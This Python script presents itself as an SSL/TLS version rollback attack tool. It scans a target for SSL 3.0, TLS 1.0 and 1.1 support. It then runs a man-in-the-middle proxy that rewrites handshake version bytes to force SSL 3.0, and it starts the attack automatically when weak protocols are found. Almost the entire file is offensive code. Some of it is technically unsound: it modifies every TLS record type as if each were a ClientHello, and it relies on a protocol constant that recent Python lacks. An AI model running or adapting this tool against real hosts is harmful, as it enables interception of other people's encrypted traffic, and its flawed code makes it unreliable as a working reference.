#!/usr/bin/env python3
"""
ssl_downgrade.py - SSL/TLS Version Rollback Attack

This script attempts to force a target to use weaker SSL/TLS versions
by intercepting and modifying the SSL handshake.
"""

import socket
import ssl
import struct
import threading
import time
import argparse
from scapy.all import *

class SSLDowngradeAttack:
    def __init__(self, target_host, target_port=443):
        self.target_host = target_host
        self.target_port = target_port
        self.proxy_port = 8443
        
    def create_fake_client_hello(self, original_data):
        """Modify ClientHello to only advertise weak protocols"""
        try:
            # Parse the original ClientHello
            if len(original_data) < 43:
                return original_data
                
            # TLS record header (5 bytes) + handshake header (4 bytes)
            record_type = original_data[0]
            version = struct.unpack('>H', original_data[1:3])[0]
            length = struct.unpack('>H', original_data[3:5])[0]
            
            # Force downgrade to SSL 3.0 or TLS 1.0
            if version >= 0x0301:  # TLS 1.0 or higher
                print(f"[ATTACK] Downgrading from TLS {version:04x} to SSL 3.0")
                # Modify version in record header
                modified_data = bytearray(original_data)
                modified_data[1:3] = struct.pack('>H', 0x0300)  # SSL 3.0
                
                # Also modify version in handshake if it's ClientHello
                if len(modified_data) > 9 and modified_data[5] == 0x01:  # ClientHello
                    modified_data[9:11] = struct.pack('>H', 0x0300)
                
                return bytes(modified_data)
                
            return original_data
            
        except Exception as e:
            print(f"[ERROR] Failed to modify ClientHello: {e}")
            return original_data
    
    def handle_client_connection(self, client_socket):
        """Handle connection from client and proxy to target"""
        try:
            # Connect to actual target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.target_host, self.target_port))
            
            print(f"[INFO] Proxying connection to {self.target_host}:{self.target_port}")
            
            def forward_data(source, destination, modify_ssl=False):
                """Forward data between sockets with optional SSL modification"""
                try:
                    while True:
                        data = source.recv(4096)
                        if not data:
                            break
                            
                        if modify_ssl and len(data) > 5:
                            # Check if this looks like SSL/TLS data
                            if data[0] in [0x16, 0x14, 0x15, 0x17]:  # SSL record types
                                data = self.create_fake_client_hello(data)
                        
                        destination.send(data)
                        
                except Exception as e:
                    print(f"[ERROR] Forward error: {e}")
                finally:
                    source.close()
                    destination.close()
            
            # Start forwarding threads
            client_to_target = threading.Thread(
                target=forward_data, 
                args=(client_socket, target_socket, True)
            )
            target_to_client = threading.Thread(
                target=forward_data, 
                args=(target_socket, client_socket, False)
            )
            
            client_to_target.start()
            target_to_client.start()
            
            client_to_target.join()
            target_to_client.join()
            
        except Exception as e:
            print(f"[ERROR] Connection handling error: {e}")
        finally:
            client_socket.close()
    
    def start_proxy(self):
        """Start the SSL downgrade proxy"""
        print(f"[INFO] Starting SSL downgrade proxy on port {self.proxy_port}")
        print(f"[INFO] Target: {self.target_host}:{self.target_port}")
        print(f"[ATTACK] Will attempt to downgrade SSL/TLS connections")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.proxy_port))
        server_socket.listen(5)
        
        print(f"[INFO] Proxy listening on port {self.proxy_port}")
        print("[INFO] Configure client to use this proxy for HTTPS connections")
        
        try:
            while True:
                client_socket, addr = server_socket.accept()
                print(f"[INFO] New connection from {addr}")
                
                client_thread = threading.Thread(
                    target=self.handle_client_connection,
                    args=(client_socket,)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[INFO] Stopping proxy...")
        finally:
            server_socket.close()
    
    def test_downgrade_vulnerability(self):
        """Test if target is vulnerable to version rollback"""
        print(f"[TEST] Testing {self.target_host} for downgrade vulnerability...")
        
        protocols_to_test = [
            ('SSL 3.0', ssl.PROTOCOL_SSLv3),
            ('TLS 1.0', ssl.PROTOCOL_TLSv1),
            ('TLS 1.1', ssl.PROTOCOL_TLSv1_1),
        ]
        
        vulnerable_protocols = []
        
        for name, protocol in protocols_to_test:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Try to force specific protocol
                sock = socket.create_connection((self.target_host, self.target_port), timeout=10)
                
                # Attempt connection with specific protocol
                try:
                    if protocol == ssl.PROTOCOL_SSLv3:
                        context.minimum_version = ssl.TLSVersion.SSLv3
                        context.maximum_version = ssl.TLSVersion.SSLv3
                    elif protocol == ssl.PROTOCOL_TLSv1:
                        context.minimum_version = ssl.TLSVersion.TLSv1
                        context.maximum_version = ssl.TLSVersion.TLSv1
                    elif protocol == ssl.PROTOCOL_TLSv1_1:
                        context.minimum_version = ssl.TLSVersion.TLSv1_1
                        context.maximum_version = ssl.TLSVersion.TLSv1_1
                    
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                    print(f"[VULNERABLE] {name} is supported!")
                    vulnerable_protocols.append(name)
                    ssl_sock.close()
                    
                except Exception:
                    print(f"[SAFE] {name} is not supported")
                
                sock.close()
                
            except Exception as e:
                print(f"[ERROR] Testing {name}: {e}")
        
        if vulnerable_protocols:
            print(f"\n[RESULT] Target supports weak protocols: {', '.join(vulnerable_protocols)}")
            print("[RESULT] Target may be vulnerable to downgrade attacks!")
            return True
        else:
            print("\n[RESULT] Target appears secure against downgrade attacks")
            return False

def main():
    parser = argparse.ArgumentParser(description='SSL/TLS Version Rollback Attack Tool')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('-t', '--test', action='store_true', help='Test for vulnerability only')
    parser.add_argument('--proxy-port', type=int, default=8443, help='Proxy port (default: 8443)')
    
    args = parser.parse_args()
    
    print("SSL/TLS Version Rollback Attack Tool")
    print("====================================")
    
    attacker = SSLDowngradeAttack(args.target, args.port)
    attacker.proxy_port = args.proxy_port
    
    if args.test:
        # Test vulnerability
        is_vulnerable = attacker.test_downgrade_vulnerability()
        if is_vulnerable:
            print("\n[INFO] Use without --test flag to start attack proxy")
    else:
        # Test first, then attack if vulnerable
        print("[INFO] Testing vulnerability first...")
        is_vulnerable = attacker.test_downgrade_vulnerability()
        
        if is_vulnerable:
            print("\n[ATTACK] Target is vulnerable! Starting attack proxy...")
            time.sleep(2)
            attacker.start_proxy()
        else:
            print("\n[INFO] Target is not vulnerable to this attack")

if __name__ == "__main__":
    main()
